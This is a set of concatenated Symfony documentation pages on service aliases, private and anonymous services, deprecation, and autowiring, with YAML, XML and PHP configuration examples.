It is built on top of the Symfony Framework and its Serializer
component. It provides custom normalizers and a custom encoder, custom metadata
and a caching system.

If you want to leverage the full power of the Symfony Serializer component,
take a look at how this bundle works.

.. toctree::
    :maxdepth: 1

    serializer/custom_encoders
    serializer/custom_normalizer
    serializer/custom_context_builders

.. _`API Platform`: https://api-platform.com
.. _`JSON-LD`: https://json-ld.org
.. _`Hydra Core Vocabulary`: https://www.hydra-cg.com/
.. _`OpenAPI`: https://www.openapis.org
.. _`GraphQL`: https://graphql.org
.. _`JSON:API`: https://jsonapi.org
.. _`HAL`: https://stateless.group/hal_specification.html
How to Create Service Aliases and Mark Services as Private
==========================================================

.. _container-private-services:

Marking Services as Public / Private
------------------------------------

When defining a service, it can be made to be *public* or *private*. If a service
is *public*, it means that you can access it directly from the container at runtime.
For example, the ``doctrine`` service is a public service::

    // only public services can be accessed in this way
    $doctrine = $container->get('doctrine');

But typically, services are accessed using :ref:`dependency injection <services-constructor-injection>`.
And in this case, those services do *not* need to be public.

.. _inlined-private-services:

So unless you *specifically* need to access a service directly from the container
via ``$container->get()``, the best-practice is to make your services *private*.
In fact, All services  are :ref:`private <container-public>` by default.

You can also control the ``public`` option on a service-by-service basis:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Service\Foo:
                public: true

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Service\Foo" public="true"/>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\Foo;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(Foo::class)
                ->public();
        };

.. _services-why-private:

Private services are special because they allow the container to optimize whether
and how they are instantiated. This increases the container's performance. It also
gives you better errors: if you try to reference a non-existent service, you will
get a clear error when you refresh *any* page, even if the problematic code would
not have run on that page.

Now that the service is private, you *must not* fetch the service directly
from the container::

    use App\Service\Foo;

    $container->get(Foo::class);

Thus, a service can be marked as private if you do not want to access it
directly from your code. However, if a service has been marked as private,
you can still alias it (see below) to access this service (via the alias).

.. _services-alias:

Aliasing
--------

You may sometimes want to use shortcuts to access some services. You can
do so by aliasing them and, furthermore, you can even alias non-public
services.

.. configuration-block::

    .. code-block:: php-attributes

        // src/Mail/PhpMailer.php
        namespace App\Mail;

        // ...
        use Symfony\Component\DependencyInjection\Attribute\AsAlias;

        #[AsAlias(id: 'app.mailer', public: true)]
        class PhpMailer
        {
            // ...
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...
            App\Mail\PhpMailer:
                public: false

            app.mailer:
                alias: App\Mail\PhpMailer
                public: true

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Mail\PhpMailer" public="false"/>

                <service id="app.mailer" alias="App\Mail\PhpMailer"/>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Mail\PhpMailer;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(PhpMailer::class)
                ->private();

            $services->alias('app.mailer', PhpMailer::class);
        };

This means that when using the container directly, you can access the
``PhpMailer`` service by asking for the ``app.mailer`` service like this::

    $container->get('app.mailer'); // Would return a PhpMailer instance

.. tip::

    In YAML, you can also use a shortcut to alias a service:

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...
            app.mailer: '@App\Mail\PhpMailer'

.. tip::

    When using ``#[AsAlias]`` attribute, you may omit passing ``id`` argument
    if the class implements exactly one interface. ``MailerInterface`` will be
    alias of ``PhpMailer``::

        // src/Mail/PhpMailer.php
        namespace App\Mail;

        // ...
        use Symfony\Component\DependencyInjection\Attribute\AsAlias;
        use Symfony\Component\Mailer\MailerInterface;

        #[AsAlias]
        class PhpMailer implements MailerInterface
        {
            // ...
        }

Deprecating Service Aliases
~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you decide to deprecate the use of a service alias (because it is outdated
or you decided not to maintain it anymore), you can deprecate its definition:

.. configuration-block::

    .. code-block:: yaml

        app.mailer:
            alias: 'App\Mail\PhpMailer'

            # this outputs the following generic deprecation message:
            # Since acme/package 1.2: The "app.mailer" service alias is deprecated. You should stop using it, as it will be removed in the future
            deprecated:
                package: 'acme/package'
                version: '1.2'

            # you can also define a custom deprecation message (%alias_id% placeholder is available)
            deprecated:
                package: 'acme/package'
                version: '1.2'
                message: 'The "%alias_id%" alias is deprecated. Do not use it anymore.'

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-Instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="app.mailer" alias="App\Mail\PhpMailer">
                    <!-- this outputs the following generic deprecation message:
                         Since acme/package 1.2: The "app.mailer" service alias is deprecated. You should stop using it, as it will be removed in the future -->
                    <deprecated package="acme/package" version="1.2"/>

                    <!-- you can also define a custom deprecation message (%alias_id% placeholder is available) -->
                    <deprecated package="acme/package" version="1.2">
                        The "%alias_id%" service alias is deprecated. Don't use it anymore.
                    </deprecated>
                </service>
            </services>
        </container>

    .. code-block:: php

        $container
            ->setAlias('app.mailer', 'App\Mail\PhpMailer')

            // this outputs the following generic deprecation message:
            // Since acme/package 1.2: The "app.mailer" service alias is deprecated. You should stop using it, as it will be removed in the future
            ->setDeprecated('acme/package', '1.2')

            // you can also define a custom deprecation message (%alias_id% placeholder is available)
            ->setDeprecated(
                'acme/package',
                '1.2',
                'The "%alias_id%" service alias is deprecated. Don\'t use it anymore.'
            )
        ;

Now, every time this service alias is used, a deprecation warning is triggered,
advising you to stop or to change your uses of that alias.

The message is actually a message template, which replaces occurrences of the
``%alias_id%`` placeholder by the service alias id. You **must** have at least
one occurrence of the ``%alias_id%`` placeholder in your template.

Anonymous Services
------------------

In some cases, you may want to prevent a service being used as a dependency of
other services. This can be achieved by creating an anonymous service. These
services are like regular services but they don't define an ID and they are
created where they are used.

The following example shows how to inject an anonymous service into another service:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Foo:
                arguments:
                    - !service
                        class: App\AnonymousBar

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="foo" class="App\Foo">
                    <argument type="service">
                        <service class="App\AnonymousBar"/>
                    </argument>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\AnonymousBar;
        use App\Foo;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(Foo::class)
                ->args([inline_service(AnonymousBar::class)]);
        };

.. note::

    Anonymous services do *NOT* inherit the definitions provided from the
    defaults defined in the configuration. So you'll need to explicitly mark
    service as autowired or autoconfigured when doing an anonymous service
    e.g.: ``inline_service(Foo::class)->autowire()->autoconfigure()``.

Using an anonymous service as a factory looks like this:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\Foo:
                factory: [ !service { class: App\FooFactory }, 'constructFoo' ]

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="foo" class="App\Foo">
                    <factory method="constructFoo">
                        <service class="App\FooFactory"/>
                    </factory>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\AnonymousBar;
        use App\Foo;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(Foo::class)
                ->factory([inline_service(AnonymousBar::class), 'constructFoo']);
        };

Deprecating Services
--------------------

Once you have decided to deprecate the use of a service (because it is outdated
or you decided not to maintain it anymore), you can deprecate its definition:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        App\Service\OldService:
            deprecated:
                package: 'vendor-name/package-name'
                version: '2.8'
                message: The "%service_id%" service is deprecated since vendor-name/package-name 2.8 and will be removed in 3.0.

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-Instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Service\OldService">
                    <deprecated package="vendor-name/package-name" version="2.8">The "%service_id%" service is deprecated since vendor-name/package-name 2.8 and will be removed in 3.0.</deprecated>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\OldService;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(OldService::class)
                ->deprecate(
                    'vendor-name/package-name',
                    '2.8',
                    'The "%service_id%" service is deprecated since vendor-name/package-name 2.8 and will be removed in 3.0.'
                );
        };

Now, every time this service is used, a deprecation warning is triggered,
advising you to stop or to change your uses of that service.

The message is actually a message template, which replaces occurrences of the
``%service_id%`` placeholder by the service's id. You **must** have at least one
occurrence of the ``%service_id%`` placeholder in your template.

.. note::

    The deprecation message is optional. If not set, Symfony will show this default
    message: ``The "%service_id%" service is deprecated. You should stop using it,
    as it will soon be removed.``.

.. tip::

    It is strongly recommended that you define a custom message because the
    default one is too generic. A good message informs when this service was
    deprecated, until when it will be maintained and the alternative services
    to use (if any).

For service decorators (see :doc:`/service_container/service_decoration`), if the
definition does not modify the deprecated status, it will inherit the status from
the definition that is decorated.
Defining Services Dependencies Automatically (Autowiring)
=========================================================

Autowiring allows you to manage services in the container with minimal
configuration. It reads the type-hints on your constructor (or other methods)
and automatically passes the correct services to each method. Symfony's
autowiring is designed to be predictable: if it is not absolutely clear which
dependency should be passed, you'll see an actionable exception.

.. tip::

    Thanks to Symfony's compiled container, there is no runtime overhead for using
    autowiring.

An Autowiring Example
---------------------

Imagine you're building an API to publish statuses on a Twitter feed, obfuscated
with `ROT13`_, a fun encoder that shifts all characters 13 letters forward in
the alphabet.

Start by creating a ROT13 transformer class::

    // src/Util/Rot13Transformer.php
    namespace App\Util;

    class Rot13Transformer
    {
        public function transform(string $value): string
        {
            return str_rot13($value);
        }
    }

And now a Twitter client using this transformer::

    // src/Service/TwitterClient.php
    namespace App\Service;

    use App\Util\Rot13Transformer;
    // ...

    class TwitterClient
    {
        public function __construct(
            private Rot13Transformer $transformer,
        ) {
        }

        public function tweet(User $user, string $key, string $status): void
        {
            $transformedStatus = $this->transformer->transform($status);

            // ... connect to Twitter and send the encoded status
        }
    }

If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
**both classes are automatically registered as services and configured to be autowired**.
This means you can use them immediately without *any* configuration.

However, to understand autowiring better, the following examples explicitly configure
both services:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            _defaults:
                autowire: true
                autoconfigure: true
            # ...

            App\Service\TwitterClient:
                # redundant thanks to _defaults, but value is overridable on each service
                autowire: true

            App\Util\Rot13Transformer:
                autowire: true

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <defaults autowire="true" autoconfigure="true"/>
                <!-- ... -->

                <!-- autowire is redundant thanks to defaults, but value is overridable on each service -->
                <service id="App\Service\TwitterClient" autowire="true"/>

                <service id="App\Util\Rot13Transformer" autowire="true"/>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        return function(ContainerConfigurator $container): void {
            $services = $container->services()
                ->defaults()
                    ->autowire()
                    ->autoconfigure()
            ;

            $services->set(TwitterClient::class)
                // redundant thanks to defaults, but value is overridable on each service
                ->autowire();

            $services->set(Rot13Transformer::class)
                ->autowire();
        };

Now, you can use the ``TwitterClient`` service immediately in a controller::

    // src/Controller/DefaultController.php
    namespace App\Controller;

    use App\Service\TwitterClient;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class DefaultController extends AbstractController
    {
        #[Route('/tweet')]
        public function tweet(TwitterClient $twitterClient, Request $request): Response
        {
            // fetch $user, $key, $status from the POST'ed data

            $twitterClient->tweet($user, $key, $status);

            // ...
        }
    }

This works automatically! The container knows to pass the ``Rot13Transformer`` service
as the first argument when creating the ``TwitterClient`` service.

.. _autowiring-logic-explained:

Autowiring Logic Explained
--------------------------

Autowiring works by reading the ``Rot13Transformer`` *type-hint* in ``TwitterClient``::

    // src/Service/TwitterClient.php
    namespace App\Service;

    // ...
    use App\Util\Rot13Transformer;

    class TwitterClient
    {
        // ...

        public function __construct(
            private Rot13Transformer $transformer,
        ) {
        }
    }

The autowiring system **looks for a service whose id exactly matches the type-hint**:
so ``App\Util\Rot13Transformer``. In this case, that exists! When you configured
the ``Rot13Transformer`` service, you used its fully-qualified class name as its
id. Autowiring isn't magic: it looks for a service whose id matches the type-hint.
If you :ref:`load services automatically <service-container-services-load-example>`,
each service's id is its class name.

If there is *not* a service whose id exactly matches the type, a clear exception
will be thrown.

Autowiring is a great way to automate configuration, and Symfony tries to be as
*predictable* and as clear as possible.

.. _service-autowiring-alias:

Using Aliases to Enable Autowiring
----------------------------------

The main way to configure autowiring is to create a service whose id exactly matches
its class. In the previous example, the service's id is ``App\Util\Rot13Transformer``,
which allows us to autowire this type automatically.

This can also be accomplished using an :ref:`alias <services-alias>`. Suppose that
for some reason, the id of the service was instead ``app.rot13.transformer``. In
this case, any arguments type-hinted with the class name (``App\Util\Rot13Transformer``)
can no longer be autowired.

No problem! To fix this, you can *create* a service whose id matches the class by
adding a service alias:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            # the id is not a class, so it won't be used for autowiring
            app.rot13.transformer:
                class: App\Util\Rot13Transformer
                # ...

            # but this fixes it!
            # the "app.rot13.transformer" service will be injected when
            # an App\Util\Rot13Transformer type-hint is detected
            App\Util\Rot13Transformer: '@app.rot13.transformer'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="app.rot13.transformer" class="App\Util\Rot13Transformer" autowire="true"/>
                <service id="App\Util\Rot13Transformer" alias="app.rot13.transformer"/>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Util\Rot13Transformer;

        return function(ContainerConfigurator $container): void {
            // ...

            // the id is not a class, so it won't be used for autowiring
            $services->set('app.rot13.transformer', Rot13Transformer::class)
                ->autowire();

            // but this fixes it!
            // the "app.rot13.transformer" service will be injected when
            // an App\Util\Rot13Transformer type-hint is detected
            $services->alias(Rot13Transformer::class, 'app.rot13.transformer');
        };

This creates a service "alias", whose id is ``App\Util\Rot13Transformer``.
Thanks to this, autowiring sees this and uses it whenever the ``Rot13Transformer``
class is type-hinted.

.. tip::

    Aliases are used by the core bundles to allow services to be autowired. For
    example, MonologBundle creates a service whose id is ``logger``. But it also
    adds an alias: ``Psr\Log\LoggerInterface`` that points to the ``logger`` service.
    This is why arguments type-hinted with ``Psr\Log\LoggerInterface`` can be autowired.

.. _autowiring-interface-alias:

Working with Interfaces
-----------------------

You might also find yourself type-hinting abstractions (e.g. interfaces) instead
of concrete classes as it replaces your dependencies with other objects.

To follow this best practice, suppose you decide to create a ``TransformerInterface``::

    // src/Util/TransformerInterface.php
    namespace App\Util;

    interface TransformerInterface
    {
        public function transform(string $value): string;
    }

Then, you update ``Rot13Transformer`` to implement it::

    // ...
    class Rot13Transformer implements TransformerInterface
    {
        // ...
    }

Now that you have an interface, you should use this as your type-hint::

    class TwitterClient
    {
        public function __construct(
            private TransformerInterface $transformer,
        ) {
            // ...
        }

        // ...
    }

But now, the type-hint (``App\Util\TransformerInterface``) no longer matches
the id of the service (``App\Util\Rot13Transformer``). This means that the
argument can no longer be autowired.

To fix that, add an :ref:`alias <service-autowiring-alias>`:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Util\Rot13Transformer: ~

            # the ``App\Util\Rot13Transformer`` service will be injected when
            # an ``App\Util\TransformerInterface`` type-hint is detected
            App\Util\TransformerInterface: '@App\Util\Rot13Transformer'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->
                <service id="App\Util\Rot13Transformer"/>

                <service id="App\Util\TransformerInterface" alias="App\Util\Rot13Transformer"/>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Util\Rot13Transformer;
        use App\Util\TransformerInterface;

        return function(ContainerConfigurator $container): void {
            // ...

            $services->set(Rot13Transformer::class);

            // the App\Util\Rot13Transformer service will be injected when
            // an App\Util\TransformerInterface type-hint is detected
            $services->alias(TransformerInterface::class, Rot13Transformer::class);
        };

Thanks to the ``App\Util\TransformerInterface`` alias, the autowiring subsystem
knows that the ``App\Util\Rot13Transformer`` service should be injected when
dealing with the ``TransformerInterface``.

.. tip::

    When using a `service definition prototype`_, if only one service is
    discovered that implements an interface, configuring the alias is not mandatory
    and Symfony will automatically create one.

.. tip::

    Autowiring is powerful enough to guess which service to inject even when using
    union and intersection types. This means you're able to type-hint argument with
    complex types like this::

        use Symfony\Component\Serializer\Normalizer\DenormalizerInterface;
        use Symfony\Component\Serializer\Normalizer\NormalizerInterface;
        use Symfony\Component\Serializer\SerializerInterface;

        class DataFormatter
        {
            public function __construct(
                private (NormalizerInterface&DenormalizerInterface)|SerializerInterface $transformer,
            ) {
                // ...
            }

            // ...
        }

.. _autowiring-multiple-implementations-same-type:

Dealing with Multiple Implementations of the Same Type
------------------------------------------------------

Suppose you create a second class - ``UppercaseTransformer`` that implements
``TransformerInterface``::

    // src/Util/UppercaseTransformer.php
    namespace App\Util;

    class UppercaseTransformer implements TransformerInterface
    {
        public function transform(string $value): string
        {
            return strtoupper($value);
        }
    }

If you register this as a service, you now have *two* services that implement the
``App\Util\TransformerInterface`` type. Autowiring subsystem can not decide
which one to use. Remember, autowiring isn't magic; it looks for a service
whose id matches the type-hint. So you need to choose one by creating an alias
from the type to the correct service id (see :ref:`autowiring-interface-alias`).
Additionally, you can define several named autowiring aliases if you want to use
one implementation in some cases, and another implementation in some
other cases.

.. _autowiring-alias:

For instance, you may want to use the ``Rot13Transformer``
implementation by default when the ``TransformerInterface`` interface is
type hinted, but use the ``UppercaseTransformer`` implementation in some
specific cases. To do so, you can create a normal alias from the
``TransformerInterface`` interface to ``Rot13Transformer``, and then
create a *named autowiring alias* from a special string containing the
interface followed by a variable name matching the one you use when doing
the injection::

    // src/Service/MastodonClient.php
    namespace App\Service;

    use App\Util\TransformerInterface;

    class MastodonClient
    {
        public function __construct(
            private TransformerInterface $shoutyTransformer,
        ) {
        }

        public function toot(User $user, string $key, string $status): void
        {
            $transformedStatus = $this->transformer->transform($status);

            // ... connect to Mastodon and send the transformed status
        }
    }

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Util\Rot13Transformer: ~
            App\Util\UppercaseTransformer: ~

            # the ``App\Util\UppercaseTransformer`` service will be
            # injected when an ``App\Util\TransformerInterface``
            # type-hint for a ``$shoutyTransformer`` argument is detected.
            App\Util\TransformerInterface $shoutyTransformer: '@App\Util\UppercaseTransformer'

            # If the argument used for injection does not match, but the
            # type-hint still matches, the ``App\Util\Rot13Transformer``
            # service will be injected.
            App\Util\TransformerInterface: '@App\Util\Rot13Transformer'

            App\Service\TwitterClient:
                # the Rot13Transformer will be passed as the $transformer argument
                autowire: true

                # If you wanted to choose the non-default service and do not
                # want to use a named autowiring alias, wire it manually:
                # arguments:
                #     $transformer: '@App\Util\UppercaseTransformer'
                # ...

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->
                <service id="App\Util\Rot13Transformer"/>
                <service id="App\Util\UppercaseTransformer"/>

                <service id="App\Util\TransformerInterface" alias="App\Util\Rot13Transformer"/>
                <service
                    id="App\Util\TransformerInterface $shoutyTransformer"
                    alias="App\Util\UppercaseTransformer"/>

                <service id="App\Service\TwitterClient" autowire="true">
                    <!-- <argument key="$transformer" type="service" id="App\Util\UppercaseTransformer"/> -->
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Service\MastodonClient;
        use App\Service\TwitterClient;
        use App\Util\Rot13Transformer;
        use App\Util\TransformerInterface;
        use App\Util\UppercaseTransformer;

        return function(ContainerConfigurator $container): void {
            // ...

            $services->set(Rot13Transformer::class)->autowire();
            $services->set(UppercaseTransformer::class)->autowire();

            // the App\Util\UppercaseTransformer service will be
            // injected when an App\Util\TransformerInterface
            // type-hint for a $shoutyTransformer argument is detected.
            $services->alias(TransformerInterface::class.' $shoutyTransformer', UppercaseTransformer::class);

            // If the argument used for injection does not match, but the
            // type-hint still matches, the App\Util\Rot13Transformer
            // service will be injected.
            $services->alias(TransformerInterface::class, Rot13Transformer::class);

            $services->set(TwitterClient::class)
                // the Rot13Transformer will be passed as the $transformer argument
                ->autowire()

                // If you wanted to choose the non-default service and do not
                // want to use a named autowiring alias, wire it manually:
                //     ->arg('$transformer', service(UppercaseTransformer::class))
                // ...
            ;
        };

Thanks to the ``App\Util\TransformerInterface`` alias, any argument type-hinted
with this interface will be passed the ``App\Util\Rot13Transformer`` service.
If the argument is named ``$shoutyTransformer``,
``App\Util\UppercaseTransformer`` will be used instead.
But, you can also manually wire any *other* service by specifying the argument
under the arguments key.

Another possibility is to use the ``#[Target]`` attribute. By using this attribute
on the argument you want to autowire, you can define exactly which service to inject
by using its alias. Thanks to this, you're able to have multiple services implementing
the same interface and keep the argument name decorrelated of any implementation name
(like shown in the example above).

Let's say you defined the ``app.uppercase_transformer`` alias for the
``App\Util\UppercaseTransformer`` service. You would be able to use the ``#[Target]``
attribute like this::

    // src/Service/MastodonClient.php
    namespace App\Service;

    use App\Util\TransformerInterface;
    use Symfony\Component\DependencyInjection\Attribute\Target;

    class MastodonClient
    {
        public function __construct(
            #[Target('app.uppercase_transformer')]
            private TransformerInterface $transformer,
        ){
        }
    }

.. note::

    Some IDEs will show an error when using ``#[Target]`` as in the previous example:
    *"Attribute cannot be applied to a property because it does not contain the 'Attribute::TARGET_PROPERTY' flag"*.
    The reason is that thanks to `PHP constructor promotion`_ this constructor
    argument is both a parameter and a class property. You can safely ignore this error message.

.. _autowire-attribute:

Fixing Non-Autowireable Arguments
---------------------------------

Autowiring only works when your argument is an *object*. But if you have a scalar
argument (e.g. a string), this cannot be autowired: Symfony will throw a clear
exception.

To fix this, you can :ref:`manually wire the problematic argument <services-manually-wire-args>`
in the service configuration. You wire up only the difficult arguments,
Symfony takes care of the rest.

You can also use the ``#[Autowire]`` parameter attribute to instruct the autowiring
logic about those arguments::

    // src/Service/MessageGenerator.php
    namespace App\Service;

    use Psr\Log\LoggerInterface;
    use Symfony\Component\DependencyInjection\Attribute\Autowire;

    class MessageGenerator
    {
        public function __construct(
            #[Autowire(service: 'monolog.logger.request')]
            private LoggerInterface $logger,
        ) {
            // ...
        }
    }

The ``#[Autowire]`` attribute can also be used for :ref:`parameters <service-parameters>`,
:doc:`complex expressions </service_container/expression_language>` and even
:ref:`environment variables <config-env-vars>` ,
:doc:`including env variable processors </configuration/env_var_processors>`::

    // src/Service/MessageGenerator.php
    namespace App\Service;

    use Psr\Log\LoggerInterface;
    use Symfony\Component\DependencyInjection\Attribute\Autowire;

    class MessageGenerator
    {
        public function __construct(
            // use the %...% syntax for parameters
            #[Autowire('%kernel.project_dir%/data')]
            string $dataDir,

            // or use argument "param"
            #[Autowire(param: 'kernel.debug')]
            bool $debugMode,

            // expressions
            #[Autowire(expression: 'service("App\\\Mail\\\MailerConfiguration").getMailerMethod()')]
            string $mailerMethod,

            // environment variables
            #[Autowire(env: 'SOME_ENV_VAR')]
            string $senderName,

            // environment variables with processors
            #[Autowire(env: 'bool:SOME_BOOL_ENV_VAR')]
            bool $allowAttachments,
        ) {
        }
        // ...
    }

.. _autowiring_closures:

Generate Closures With Autowiring
---------------------------------

A **service closure** is an anonymous function that returns a service. This type
of instantiation is handy when you are dealing with lazy-loading.  It is also
useful for non-shared service dependencies.

Automatically creating a closure encapsulating the service instantiation can be
done with the
:class:`Symfony\\Component\\DependencyInjection\\Attribute\\AutowireServiceClosure`
attribute::

    // src/Service/Remote/MessageFormatter.php
    namespace App\Service\Remote;

    use Symfony\Component\DependencyInjection\Attribute\AsAlias;

    #[AsAlias('third_party.remote_message_formatter')]
    class MessageFormatter
    {
        public function __construct()
        {
            // ...
        }

        public function format(string $message): string
        {
            // ...
        }
    }

    // src/Service/MessageGenerator.php
    namespace App\Service;

    use App\Service\Remote\MessageFormatter;
    use Symfony\Component\DependencyInjection\Attribute\AutowireServiceClosure;

    class MessageGenerator
    {
        public function __construct(
            #[AutowireServiceClosure('third_party.remote_message_formatter')]
            private \Closure $messageFormatterResolver,
        ) {
        }

        public function generate(string $message): void
        {
            $formattedMessage = ($this->messageFormatterResolver)()->format($message);

            // ...
        }
    }

It is common that a service accepts a closure with a specific signature.
In this case, you can use the
:class:`Symfony\\Component\\DependencyInjection\\Attribute\\AutowireCallable` attribute
to generate a closure with the same signature as a specific method of a service. When
this closure is called, it will pass all its arguments to the underlying service
function.  If the closure needs to be called more than once, the service instance
is reused for repeated calls.  Unlike a service closure, this will not
create extra instances of a non-shared service::

    // src/Service/MessageGenerator.php
    namespace App\Service;

    use Symfony\Component\DependencyInjection\Attribute\AutowireCallable;

    class MessageGenerator
    {
        public function __construct(
            #[AutowireCallable(service: 'third_party.remote_message_formatter', method: 'format')]
            private \Closure $formatCallable,
        ) {
        }

        public function generate(string $message): void
        {
            $formattedMessage = ($this->formatCallable)($message);

            // ...
        }
    }

Finally, you can pass the ``lazy: true`` option to the
:class:`Symfony\\Component\\DependencyInjection\\Attribute\\AutowireCallable`
attribute. By doing so, the callable will automatically be lazy, which means
that the encapsulated service will be instantiated **only** at the
closure's first call.

The :class:`Symfony\\Component\\DependencyInjection\\Attribute\\AutowireMethodOf`
attribute provides a simpler way of specifying the name of the service method
by using the property name as method name::

    // src/Service/MessageGenerator.php
    namespace App\Service;

    use Symfony\Component\DependencyInjection\Attribute\AutowireMethodOf;

    class MessageGenerator
    {
        public function __construct(
            #[AutowireMethodOf('third_party.remote_message_formatter')]
            private \Closure $format,
        ) {
        }

        public function generate(string $message): void
        {
            $formattedMessage = ($this->format)($message);

            // ...
        }
    }

.. versionadded:: 7.1

    The :class:`Symfony\Component\DependencyInjection\Attribute\\AutowireMethodOf`
    attribute was introduced in Symfony 7.1.

.. _autowiring-calls:

Autowiring other Methods (e.g. Setters and Public Typed Properties)
-------------------------------------------------------------------

When autowiring is enabled for a service, you can *also* configure the container
to call methods on your class when it's instantiated. For example, suppose you want
to inject the ``logger`` service, and decide to use setter-injection:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Util/Rot13Transformer.php
        namespace App\Util;

        use Symfony\Contracts\Service\Attribute\Required;

        class Rot13Transformer
        {
            private LoggerInterface $logger;

            #[Required]
            public function setLogger(LoggerInterface $logger): void
            {
                $this->logger = $logger;
            }

            public function transform($value): string
            {
                $this->logger->info('Transforming '.$value);
                // ...
            }
        }

Autowiring will automatically call *any* method with the ``#[Required]`` attribute
above it, autowiring each argument. If you need to manually wire some of the arguments
to a method, you can always explicitly :doc:`configure the method call </service_container/calls>`.

Despite property injection having some :ref:`drawbacks <property-injection>`,
autowiring with ``#[Required]`` can also be applied to public
typed properties:

.. configuration-block::

    .. code-block:: php-attributes

        namespace App\Util;

        use Symfony\Contracts\Service\Attribute\Required;

